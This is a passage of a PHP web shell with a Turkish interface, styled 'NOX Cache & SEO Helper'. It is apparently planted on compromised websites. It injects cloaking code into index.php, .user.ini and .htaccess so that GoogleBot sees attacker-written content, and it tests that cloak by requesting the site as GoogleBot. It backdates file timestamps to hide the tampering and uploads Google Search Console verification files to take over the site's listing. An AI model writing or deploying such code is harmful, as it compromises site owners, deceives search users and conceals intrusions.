  if($out===false){array_walk_recursive($res,function(&$v){if(is_string($v))$v=function_exists('iconv')?(string)@iconv('UTF-8','UTF-8//IGNORE',$v):substr($v,0,500);});$out=json_encode($res,JSON_UNESCAPED_UNICODE);if($out===false)$out='{"fatal":"json_encode_fail"}';}
  header("Content-Type:application/json");echo $out;exit;
}

// ---- Action: fixtimestamp ----
if($a==="fixtimestamp"){
  $cms=nox_detect_cms($DIR);$files=nox_file_names($cms);
  $prependPath=$DIR.'/'.$files['prepend'];
  $contentPath=nox_content_path($DIR,$files['content']);
  $targets=['index.php'=>$DIR.'/index.php','prepend'=>$prependPath,'content'=>$contentPath];
  $skip=[basename(__FILE__),$files['prepend']];
  $refMt=ref_mtime($DIR,array_merge($skip,['index.php']));$res=[];
  if(!$refMt){$res['ref']=['s'=>'warn','m'=>'Referans dosya bulunamadı'];header("Content-Type:application/json");echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;}
  $res['ref']=['s'=>'ok','m'=>'Referans: '.date('d.m.Y H:i',$refMt)];
  foreach($targets as $label=>$fp){
    if(!file_exists($fp)){$res[$label]=['s'=>'na','m'=>'Dosya yok'];continue;}
    $old=@filemtime($fp);$ok=@touch($fp,$refMt);
    $res[$label]=['s'=>$ok?'ok':'err','m'=>date('d.m.Y H:i',$old).' → '.date('d.m.Y H:i',$refMt)];
  }
  header("Content-Type:application/json");echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;
}

if($a==="info"){echo"<pre>PHP ".PHP_VERSION."\n".php_uname()."\nSAPI: ".php_sapi_name()."\nCMS: ".nox_cms_label(nox_detect_cms($DIR))."</pre>";exit;}

// ---- Durum Sayfası ----
$cms=nox_detect_cms($DIR);$sapi=nox_detect_sapi();$files=nox_file_names($cms);
$prependPath=$DIR.'/'.$files['prepend'];$contentPath=nox_content_path($DIR,$files['content']);
$prependExists=file_exists($prependPath);$contentExists=file_exists($contentPath);
$idxPath=$DIR.'/index.php';$uiPath=$DIR.'/.user.ini';$htPath=$DIR.'/.htaccess';
$uiC=file_exists($uiPath)?(string)@file_get_contents($uiPath):'';
$idxC=file_exists($idxPath)?(string)@file_get_contents($idxPath):'';
$htC=file_exists($htPath)?(string)@file_get_contents($htPath):'';
$v1=strpos($uiC,'auto_prepend_file')!==false;
$v2=strpos($idxC,'NOX-CLOAK-START')!==false;
$v3=(bool)preg_match('/NOX-HT-START/',$htC);
$htAvail=($sapi==='mod_php'||$sapi==='litespeed');
$googleFiles=list_google_files($DIR);
$pk='p='.rawurlencode($_np);
$prependSz=$prependExists?number_format(@filesize($prependPath)):'—';
$contentSz=$contentExists?number_format(@filesize($contentPath)):'—';
$idxSz=file_exists($idxPath)?number_format(@filesize($idxPath)):'—';
header('Content-Type: text/html; charset=utf-8');
?><!DOCTYPE html><html lang="tr"><head><meta charset="utf-8">
<title><?=htmlspecialchars($_SERVER['HTTP_HOST'])?></title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{background:#1a1a2e;color:#0ff;font-family:monospace;padding:24px;margin:0;max-width:860px;margin:0 auto}
h1{color:#0f0;margin:0 0 4px;font-size:19px}
.sub{color:#555;font-size:12px;margin-bottom:18px}
a{color:#0f0}
.card{border:1px solid #0f3;border-radius:6px;padding:16px;margin:12px 0;background:#16213e}
.card h3{color:#0f3;margin:0 0 12px;font-size:13px;text-transform:uppercase;letter-spacing:.08em}
.sr{display:flex;align-items:center;gap:10px;margin:5px 0;font-size:13px;flex-wrap:wrap}
.dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
.dot.ok{background:#0f0}.dot.warn{background:#fa0}.dot.err{background:#c33}.dot.na{background:#444}
.fl{color:#0ff;min-width:220px}.fs{color:#555;font-size:11px}
.vbadge{font-size:11px;padding:2px 7px;border-radius:3px;font-weight:bold}
.vb-ok{background:#0a2e0a;border:1px solid #0f0;color:#0f0}
.vb-na{background:#111;border:1px solid #444;color:#555}
.vb-skip{background:#1a1a0a;border:1px solid #555;color:#888}
.btn{cursor:pointer;font-weight:bold;padding:9px 18px;border:none;font-family:monospace;font-size:13px;border-radius:4px;transition:opacity .15s}
.btn:hover{opacity:.85}.btn:active{opacity:.65}
.btn-row{display:flex;gap:8px;margin:8px 0;flex-wrap:wrap}
.btn-row .btn{flex:1;min-width:150px}
.btn-cloak{background:#0a2e10;color:#0f3;border:1px solid #0a9}
.btn-revert{background:#2e1800;color:#fa0;border:1px solid #c80}
.btn-cache{background:#1a4a4a;color:#0ff;border:1px solid #0cc}
.btn-check{background:#0a1a3a;color:#4af;border:1px solid #38c}
.btn-ts{background:#2a1a4a;color:#c8a0ff;border:1px solid #7755cc}
.btn-save{background:#08c;color:#fff}.btn-load{background:#333;color:#0f0}
.cr{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:3px;font-size:12px;margin:3px 0}
.c-ok{background:#0a1e0a;border-left:3px solid #0f0;color:#0f0}
.c-err{background:#1e0a0a;border-left:3px solid #f55;color:#f55}
.c-warn{background:#1e180a;border-left:3px solid #fa0;color:#fa0}
.c-na{background:#111;border-left:3px solid #444;color:#555}
.msg{margin-top:10px;font-size:13px;min-height:18px}
.msg.ok{color:#0f0}.msg.err{color:#f55}.msg.info{color:#0ff}
textarea{background:#0a1228;color:#0ff;border:1px solid #0f3;padding:8px;font-family:monospace;font-size:12px;width:100%;height:240px;border-radius:4px;resize:vertical}
input[type=text]{background:#0a1228;color:#0ff;border:1px solid #0f3;padding:6px 8px;font-family:monospace;width:100%;border-radius:4px;margin:4px 0}
.toolbar{display:flex;gap:8px;margin:8px 0;flex-wrap:wrap;align-items:center}
.note{color:#666;font-size:11px;margin:5px 0}
details>summary{cursor:pointer;color:#0f0;font-size:13px;padding:6px 0;user-select:none}
details>summary:hover{color:#0ff}
.tag{display:inline-block;padding:1px 7px;border-radius:3px;font-size:11px;margin-left:6px}
.badge-ok{background:#0a2e0a;border:1px solid #0f0;color:#0f0;padding:6px 12px;border-radius:4px;font-size:13px;font-weight:bold}
.badge-fail{background:#2e0a0a;border:1px solid #f55;color:#f55;padding:6px 12px;border-radius:4px;font-size:13px;font-weight:bold}
.badge-warn{background:#2e240a;border:1px solid #fa0;color:#fa0;padding:6px 12px;border-radius:4px;font-size:13px;font-weight:bold}
.cloak-status{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;border-radius:4px;font-size:12px;font-weight:bold;white-space:nowrap}
.cs-checking{background:#0a1228;border:1px solid #0cc;color:#0cc}
.cs-aktif{background:#0a2e0a;border:1px solid #0f0;color:#0f0}
.cs-pasif{background:#2e1a0a;border:1px solid #fa0;color:#fa0}
.cs-atilmamis{background:#1a1a1a;border:1px solid #555;color:#555}
.cms-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:3px;font-size:11px;background:#0a1a0a;border:1px solid #0a9;color:#0af;margin-left:8px}
.sapi-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:3px;font-size:11px;background:#0a0a1a;border:1px solid #559;color:#88f;margin-left:4px}
hr{border:none;border-top:1px solid #222;margin:16px 0}
.hint-warn{font-size:12px;padding:8px 12px;border-radius:4px;margin-top:8px;line-height:1.6;background:#1e180a;border-left:3px solid #fa0;color:#fa0;display:none}
</style>
</head><body>

<div style="border-top:1px solid #0f3;margin-bottom:0"></div>
<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;padding:10px 0">
  <h1 style="margin:0;font-family:monospace;letter-spacing:1px;font-size:17px;font-weight:700">NOX <span style="color:#0f0;font-weight:700;font-size:17px">| CACHE &amp; SEO HELPER</span></h1>
  <span id="cloak-status" class="cloak-status cs-checking">&#9679; Kontrol ediliyor...</span>
</div>
<div style="border-bottom:1px solid #0f3;margin-bottom:10px"></div>
<div class="sub">
  <span class="cms-badge">&#9670; <?=htmlspecialchars(nox_cms_label($cms))?></span>
  <span class="sapi-badge">&#9632; <?=htmlspecialchars(strtoupper($sapi))?> | PHP <?=PHP_MAJOR_VERSION.'.'.PHP_MINOR_VERSION?></span>
  &nbsp;|&nbsp; <?=htmlspecialchars($DIR)?> &nbsp;|&nbsp; <a href="?<?=$pk?>&a=info">PHP Info</a>
</div>

<!-- Durum -->
<div class="card">
  <h3>Durum</h3>
  <div class="sr">
    <span class="dot <?=$prependExists?'ok':'warn'?>"></span>
    <span class="fl"><?=htmlspecialchars($files['prepend'])?></span>
    <span class="fs"><?=$prependExists?"$prependSz bayt":'— mevcut değil (OTO CLOAK oluşturur) —'?></span>
  </div>
  <div class="sr">
    <span class="dot <?=$contentExists?'ok':'warn'?>"></span>
    <span class="fl"><?=htmlspecialchars($files['content'])?></span>
    <span class="fs"><?=$contentExists?"$contentSz bayt":'— mevcut değil (OTO CLOAK oluşturur) —'?></span>
    <?php if($contentExists):?><a href="?<?=$pk?>&a=viewperde" target="_blank" style="color:#0cf;font-size:11px;margin-left:8px;text-decoration:underline">Perdeyi görüntüle</a><?php endif;?>
  </div>
  <div class="sr">
    <span class="dot <?=file_exists($idxPath)?'ok':'err'?>"></span>
    <span class="fl">index.php</span>
    <span class="fs"><?=file_exists($idxPath)?"$idxSz bayt":'— mevcut değil —'?></span>
  </div>
  <hr>
  <div style="font-size:12px;color:#0cc;margin-bottom:6px;font-weight:bold">Enjeksiyon Vektörleri</div>
  <div class="sr">
    <span class="vbadge <?=$v1?'vb-ok':'vb-na'?>"><?=$v1?'&#10003; AKTİF':'&#9711; PASİF'?></span>
    <span style="font-size:12px;color:#0ff">V1: user.ini <span style="color:#555;font-size:11px">— FPM/CGI/LiteSpeed</span></span>
  </div>
  <div class="sr">
    <span class="vbadge <?=$v2?'vb-ok':'vb-na'?>"><?=$v2?'&#10003; AKTİF':'&#9711; PASİF'?></span>
    <span style="font-size:12px;color:#0ff">V2: index.php <span style="color:#555;font-size:11px">— Evrensel PHP bloğu</span></span>
  </div>
  <div class="sr">
    <span class="vbadge <?=$v3?'vb-ok':($htAvail?'vb-na':'vb-skip')?>"><?=$v3?'&#10003; AKTİF':($htAvail?'&#9711; PASİF':'&#8212; N/A')?></span>
    <span style="font-size:12px;color:#0ff">V3: .htaccess <span style="color:#555;font-size:11px">— <?=$htAvail?'mod_php tespit edildi':'Sadece mod_php (SAPI: '.$sapi.')'?></span></span>
  </div>
<?php foreach($googleFiles as $gf):$gfSz=number_format(@filesize($DIR.DIRECTORY_SEPARATOR.$gf));?>
  <div class="sr" style="margin-top:4px">
    <span class="dot ok"></span>
    <span class="fl"><?=htmlspecialchars($gf)?></span>
    <span class="fs"><?=$gfSz?> bayt</span>
    <span class="tag" style="background:#08c;color:#fff">GOOGLE</span>
    <a href="#" onclick="removeFile('<?=htmlspecialchars(addslashes($gf))?>');return false" style="color:#f66;font-size:11px;margin-left:6px">Sil</a>
  </div>
<?php endforeach;?>
</div>

<!-- Cloak İşlemleri -->
<div class="card">
  <h3>Cloak İşlemleri</h3>
  <div class="btn-row">
    <button class="btn btn-cloak" onclick="autocloak()">OTO CLOAK AT</button>
    <button class="btn btn-check" onclick="botcheck()" style="display:none" disabled>GoogleBot ile Kontrol Et</button>
  </div>
  <div class="btn-row" style="margin-top:10px">
    <button class="btn btn-revert" onclick="revert()" style="display:none" disabled>Cloak Kaldır</button>
    <button class="btn btn-cache" onclick="clearcache()" style="display:none" disabled>Cache Temizle</button>
    <button class="btn btn-ts" onclick="fixtimestamp()" style="display:none" disabled>Timestamp Düzelt</button>
    <button class="btn" style="background:#2a1a3a;color:#c9f;border:1px solid #93f" onclick="gscRichTest()">Zengin Sonuçlar Testi</button>
  </div>
  <div id="hint-ui" class="hint-warn">&#9888; user.ini vektörü eklendi. PHP-FPM cache nedeniyle ~5 dakika içinde aktif olur. index.php vektörü anında çalışır.</div>
  <div class="msg" id="cmsg"></div>
  <div id="ccresult" style="display:none;margin-top:10px">
    <div style="color:#0ff;font-size:12px;margin-bottom:6px;font-weight:bold">Cache Temizleme Raporu</div>
    <div id="ccrows"></div>
  </div>
  <div id="tsresult" style="display:none;margin-top:10px">
    <div style="color:#c8a0ff;font-size:12px;margin-bottom:6px;font-weight:bold">Timestamp Raporu</div>
    <div id="tsrows"></div>
  </div>
  <div class="msg" id="bcmsg"></div>
  <div id="bcresult" style="display:none;margin-top:10px">
    <div id="bcbadge" style="margin-bottom:8px"></div>
    <div id="bcmeta" style="font-size:12px;color:#888;margin-bottom:6px"></div>
    <details>
      <summary style="font-size:12px;color:#555;cursor:pointer">Yanıt önizlemesi (ham HTML)</summary>
      <pre id="bcpreview" style="background:#0a1228;border:1px solid #222;padding:8px;font-size:11px;color:#adf;overflow-x:auto;white-space:pre-wrap;margin:6px 0;max-height:240px;overflow-y:auto"></pre>
    </details>
  </div>
</div>

<!-- HTML Düzenleyici -->
<div class="card">
  <h3 style="margin-bottom:8px">Perde İçeriği</h3>
  <div class="note" style="color:#666;margin-bottom:6px;font-size:11px">Hedef: <code><?=htmlspecialchars($files['content'])?></code></div>
  <div id="html-nomsg" style="display:none;padding:10px 12px;color:#fa0;font-size:13px;border-left:3px solid #fa0;background:#1e180a;margin-bottom:8px;border-radius:3px">⚠ Henüz perde içeriği oluşturulmamış. Aşağıya HTML yazıp kaydedin.</div>
  <textarea id="htmlcontent" placeholder="Yükleniyor..."></textarea>
  <div class="toolbar" style="margin-top:6px">
    <button class="btn btn-check" onclick="saveHtml()">Kaydet</button>
    <span class="msg" id="hmsg"></span>
  </div>
</div>

<!-- Google Doğrulama -->
<div class="card">
  <h3>Google Search Console Doğrulama</h3>
  <div class="note">Sadece Google'ın verdiği <b>google….html</b> dosyasını yükleyin. Dosya adı <code>google</code> ile başlamalı, <code>.html</code> ile bitmeli ve yalnızca harf/rakam içermelidir. İçerik yalnızca <code>google-site-verification: TOKEN</code> satırı olmalıdır.</div>
  <div style="margin:8px 0">
    <div class="note" style="color:#0ff">Dosya adı (ör. <code>google085517675749d6fe.html</code>):</div>
    <input type="text" id="gname" placeholder="google….html">
  </div>
  <div>
    <div class="note" style="color:#0ff">Dosya içeriği:</div>
    <input type="text" id="gcontent" placeholder="google-site-verification: TOKEN_DEGERI">
  </div>
  <div class="toolbar">
    <button class="btn btn-check" onclick="uploadGoogle()">Yükle</button>
    <span class="msg" id="gmsg"></span>
  </div>
</div>



<script>
var PK=<?=json_encode('p='.rawurlencode($_np))?>;
var GOOGLE_RX=/^google[a-zA-Z0-9]+\.html$/;
var CONTENT_FILE=<?=json_encode($files['content'])?>;

function _setCloakStatus(state){
  var el=document.getElementById('cloak-status');if(!el)return;
  var map={
    checking:{cls:'cs-checking',txt:'&#9679; Kontrol ediliyor...'},
    atilmamis:{cls:'cs-atilmamis',txt:'&#9679; Cloaking Atılmamış'},
    pasif:{cls:'cs-pasif',txt:'&#9679; Cloaking: Pasif'},
    aktif:{cls:'cs-aktif',txt:'&#9679; Cloaking: Aktif'}
  };
  var m=map[state]||map.atilmamis;
  el.className='cloak-status '+m.cls;el.innerHTML=m.txt;
}

function _checkCloakActive(){
  _setCloakStatus('checking');
  var x=new XMLHttpRequest();x.open("GET","?"+PK+"&a=checkcloak&_="+Date.now());x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){try{var r=JSON.parse(x.responseText);_setCloakStatus(r.active?'aktif':(r.installed?'pasif':'atilmamis'));}catch(e){_setCloakStatus('atilmamis');}};

  x.onerror=function(){_setCloakStatus('atilmamis');};x.send();
}
window.addEventListener('load',function(){_checkCloakActive();});

function decodeB64(xhr){
  var enc=(xhr.getResponseHeader("X-Body-Encoding")||"").toLowerCase();
  if(enc!=="base64")return xhr.responseText;
  try{var bin=atob(xhr.responseText.replace(/\s+/g,""));var bytes=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);return new TextDecoder("utf-8").decode(bytes);}
  catch(e){return "Çözme hatası: "+e.message;}
}

function setMsg(id,text,type){var el=document.getElementById(id);if(!el)return;el.textContent=text;el.className="msg "+(type||"info");}

function autocloak(){
  setMsg("cmsg","İşleniyor...","info");
  document.getElementById("hint-ui").style.display="none";
  var x=new XMLHttpRequest();x.open("POST","?"+PK);x.setRequestHeader("Cache-Control","no-cache");x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  x.onload=function(){
    try{
      var r=JSON.parse(x.responseText);
      var ok=true;var parts=[];
      var keys=['content','prepend','user_ini','index','htaccess'];
      keys.forEach(function(k){
        if(!r[k])return;
        var s=r[k].s,m=r[k].m;
        if(s==='err'){ok=false;}
        parts.push(k+': '+s.toUpperCase()+(m?' ('+m+')':''));
      });
      setMsg("cmsg",parts.join(' | '),ok?"ok":"err");
      if(r.user_ini&&r.user_ini.s==='ok'&&(!r.index||r.index.s!=='ok')){
        document.getElementById("hint-ui").style.display="block";
      }
      _setCloakStatus('pasif');
      _checkCloakActive();
      if(ok){setTimeout(function(){botcheck(true);},800);}
    }catch(e){setMsg("cmsg","Hata: "+x.responseText,"err");}
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err");};x.send("a=autocloak");
}

function revert(){
  if(!confirm("Cloaking devre dışı bırakılsın mı?\nrender.lock silinecek — vektörler yerinde kalır.\nTekrar aktif etmek için Cloak At'a basın."))return;
  setMsg("cmsg","Kaldırılıyor...","info");
  var x=new XMLHttpRequest();x.open("POST","?"+PK);x.setRequestHeader("Cache-Control","no-cache");x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  x.onload=function(){
    try{
      var r=JSON.parse(x.responseText);
      var s=r.lock?r.lock.s:'err';var m=r.lock?r.lock.m:'Yanıt boş';
      setMsg("cmsg","lock: "+(s==='ok'?'Devre dışı':s==='na'?'N/A':'HATA')+(m?' ('+m+')':''),s==='err'?"err":"ok");
      _setCloakStatus('pasif');document.getElementById("hint-ui").style.display="none";
    }catch(e){setMsg("cmsg","Yanıt hatası: "+x.responseText,"err");}
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err");};x.send("a=revert");
}

function enc(s){var b=btoa(unescape(encodeURIComponent(s)));return encodeURIComponent(b.replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,""));}
function toHex(str){var bytes=new TextEncoder().encode(str),h="";for(var i=0;i<bytes.length;i++)h+=("0"+bytes[i].toString(16)).slice(-2);return h;}

(function(){
  var x=new XMLHttpRequest();x.open("GET","?"+PK+"&a=raw&b="+enc(CONTENT_FILE)+"&_="+Date.now());x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    var text=x.status===200?x.responseText.trim():'';
    var content='';
    if(text){try{var bin=atob(text.replace(/\s+/g,""));var bytes=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);content=new TextDecoder("utf-8").decode(bytes);}catch(e){content='';}}
    if(content===''){
      document.getElementById("html-nomsg").style.display="block";
      document.getElementById("htmlcontent").placeholder="Henüz içerik yok — buraya yazıp kaydedin.";
    }else{
      document.getElementById("htmlcontent").value=content;
    }
  };
  x.onerror=function(){
    document.getElementById("html-nomsg").style.display="block";
    document.getElementById("htmlcontent").placeholder="İçerik yüklenemedi.";
  };
  x.send();
})();

function saveHtml(){
  var c=document.getElementById("htmlcontent").value;
  if(c.indexOf("<"+"?")!==-1){setMsg("hmsg","PHP etiketi içeremez.","err");return;}
  setMsg("hmsg","Kaydediliyor...","info");
  var fd=new FormData();fd.append("a","savehtml");fd.append("d",toHex(c));
  var x=new XMLHttpRequest();x.open("POST","?"+PK+"&_="+Date.now());
  x.onload=function(){var ok=x.responseText==="OK";setMsg("hmsg",ok?"Kaydedildi.":"Hata: "+x.responseText,ok?"ok":"err");};
  x.onerror=function(){setMsg("hmsg","Ağ hatası","err");};x.send(fd);
}

function botcheck(auto){
  setMsg("bcmsg","GoogleBot isteği gönderiliyor...","info");
  document.getElementById("bcresult").style.display="none";
  _setCloakStatus('checking');
  var x=new XMLHttpRequest();x.open("GET","?"+PK+"&a=botcheck&_="+Date.now());x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    setMsg("bcmsg","","info");var r;
    try{r=JSON.parse(x.responseText);}catch(e){setMsg("bcmsg","JSON hatası: "+x.responseText,"err");_setCloakStatus('pasif');return;}
    if(r.error){setMsg("bcmsg",r.error,"err");return;}
    var res=document.getElementById("bcresult"),badge=document.getElementById("bcbadge"),
        meta=document.getElementById("bcmeta"),preview=document.getElementById("bcpreview");
    res.style.display="block";
    if(r.curl_error){badge.className="badge-warn";badge.textContent="cURL Hatası: "+r.curl_error;_setCloakStatus('pasif');}
    else if(r.html_empty){badge.className="badge-warn";badge.textContent="İçerik dosyası boş — karşılaştırma yapılamadı.";_setCloakStatus('pasif');}
    else if(r.matched){badge.className="badge-ok";badge.textContent="✓ CLOAK ÇALIŞIYOR — GoogleBot doğru içeriği görüyor.";_setCloakStatus('aktif');}
    else{
      badge.className="badge-fail";
      var failMsg="✗ CLOAK ÇALIŞMIYOR — GoogleBot içeriği göremedi.";
      if(r.user_ini_only)failMsg+=" (Yalnızca user.ini aktif — ~5 dk bekleyip tekrar deneyin)";
      badge.textContent=failMsg;_setCloakStatus('pasif');
    }
    meta.textContent="URL: "+r.url+" | HTTP: "+r.http_code+(r.final_url&&r.final_url!==r.url?" | Yönlendi: "+r.final_url:"");
    preview.textContent=r.preview||"(yanıt boş)";
  };
  x.onerror=function(){setMsg("bcmsg","Ağ hatası","err");_setCloakStatus('pasif');};x.send();
}

function clearcache(){
  setMsg("cmsg","Cache temizleniyor...","info");document.getElementById("ccresult").style.display="none";
  var x=new XMLHttpRequest();x.open("GET","?"+PK+"&a=clearcache&_="+Date.now());x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    setMsg("cmsg","","info");var r;try{r=JSON.parse(x.responseText);}catch(e){setMsg("cmsg","JSON hatası: "+x.responseText,"err");return;}
    if(r.fatal){setMsg("cmsg","PHP Hatası: "+r.fatal,"err");return;}
    var labels={opcache:"PHP OPcache",fpm_reload:"PHP-FPM Reload",apc:"APC Cache",memcache:"Memcache",memcached:"Memcached",redis:"Redis",
      joomla_cache:"Joomla Frontend Cache",joomla_admin:"Joomla Admin Cache",joomla_tmp:"Joomla Tmp",
      wp_cache:"WP Disk Cache",dir_w3tc:"[Dizin] W3TC",dir_wprocket:"[Dizin] WP Rocket",dir_litespeed:"[Dizin] LiteSpeed",
      dir_autoptimize:"[Dizin] Autoptimize",dir_endurance:"[Dizin] Endurance",dir_wpfastest:"[Dizin] WP Fastest",
      dir_comet:"[Dizin] Comet Cache",dir_enabler:"[Dizin] Cache Enabler",
      wp_api:"WP API",wp_object_cache:"WP Object Cache",api_supercache:"WP Super Cache",api_w3tc:"W3TC API",
      api_wprocket:"WP Rocket API",api_wpfastest:"WP Fastest API",api_autoptimize:"Autoptimize API",
      api_litespeed:"LiteSpeed API",api_sgoptimizer:"SG Optimizer",api_cacheenabler:"Cache Enabler API",
      api_comet:"Comet Cache API",litespeed_wpcli:"LiteSpeed WP-CLI",
      generic_cache:"Cache Dizini",generic_tmp:"Tmp Dizini",
      aruba:"Aruba CDN",varnish:"Varnish",nginx_cache:"Nginx FastCGI Cache",
      htaccess:".htaccess Tarama",warmup_desktop:"Warmup Masaüstü",warmup_mobile:"Warmup Mobil"};
    var html="";
    for(var k in r){
      if(!r[k]||!r[k].s)continue;
      var s=r[k].s,m=r[k].m;
      var cls=s==="ok"?"c-ok":s==="warn"?"c-warn":s==="err"?"c-err":"c-na";
      var icon=s==="ok"?"✓":s==="warn"?"⚠":s==="err"?"✗":"—";
      html+='<div class="cr '+cls+'"><b>'+icon+' '+(labels[k]||k)+'</b>: '+m+'</div>';
    }
    var el=document.getElementById("ccresult");
    document.getElementById("ccrows").innerHTML=html;el.style.display="block";
    setTimeout(function(){
      el.style.transition="opacity .6s";el.style.opacity="0";
      setTimeout(function(){
        el.style.display="none";el.style.opacity="1";el.style.transition="";
        setMsg("cmsg","✓ Cache temizleme tamamlandı — GoogleBot kontrolü veya Zengin Sonuçlar Testi yapabilirsiniz.","ok");
        setTimeout(function(){setMsg("cmsg","","info");},6000);
      },600);
    },4000);
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err");};x.send();
}

function fixtimestamp(){
  setMsg("cmsg","Timestamp düzeltiliyor...","info");document.getElementById("tsresult").style.display="none";
  var x=new XMLHttpRequest();x.open("GET","?"+PK+"&a=fixtimestamp&_="+Date.now());x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    setMsg("cmsg","","info");var r;try{r=JSON.parse(x.responseText);}catch(e){setMsg("cmsg","JSON hatası","err");return;}
    var html="";
    for(var k in r){var s=r[k].s,m=r[k].m;var cls=s==="ok"?"c-ok":s==="warn"?"c-warn":s==="err"?"c-err":"c-na";var icon=s==="ok"?"✓":s==="warn"?"⚠":s==="err"?"✗":"—";html+='<div class="cr '+cls+'"><b>'+icon+' '+k+'</b>: '+m+'</div>';}
    document.getElementById("tsrows").innerHTML=html;document.getElementById("tsresult").style.display="block";
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err");};x.send();
}

function uploadGoogle(){
  var name=document.getElementById("gname").value.trim();var content=document.getElementById("gcontent").value;
  if(!GOOGLE_RX.test(name)){setMsg("gmsg","Geçersiz ad. Ör: google085517675749d6fe.html","err");return;}
  if(!content){setMsg("gmsg","İçerik boş olamaz.","err");return;}
  if(!/^google-site-verification:\s*[A-Za-z0-9_\-\.]+\s*$/.test(content.trim())){setMsg("gmsg","Geçersiz format. Yalnızca: google-site-verification: TOKEN","err");return;}
  setMsg("gmsg","Yükleniyor...","info");
  var fd=new FormData();fd.append("a","writegoogle");fd.append("b",enc(name));fd.append("d",toHex(content));
  var x=new XMLHttpRequest();x.open("POST","?"+PK+"&_="+Date.now());
  x.onload=function(){if(x.responseText==="OK"){setMsg("gmsg","Yüklendi: "+name,"ok");setTimeout(function(){location.href="?"+PK;},1000);}else{setMsg("gmsg","Hata: "+x.responseText,"err");}};
  x.onerror=function(){setMsg("gmsg","Ağ hatası","err");};x.send(fd);
}

function gscRichTest(){
  var siteUrl=window.location.protocol+"//"+window.location.host+"/";
  var testUrl="https://search.google.com/test/rich-results?url="+encodeURIComponent(siteUrl);
  window.open(testUrl,"_blank","noopener,noreferrer");
}

function removeFile(name){
  if(!GOOGLE_RX.test(name)){alert("Yalnızca Google doğrulama dosyaları silinebilir.");return;}
  if(!confirm(name+" silinsin mi?"))return;
  var x=new XMLHttpRequest();x.open("GET","?"+PK+"&a=rmgoogle&b="+enc(name)+"&_="+Date.now());x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){if(x.responseText==="OK"){location.href="?"+PK;}else{alert("Hata: "+x.responseText);}};
  x.onerror=function(){alert("Ağ hatası");};x.send();
}

</script>
</body></html>
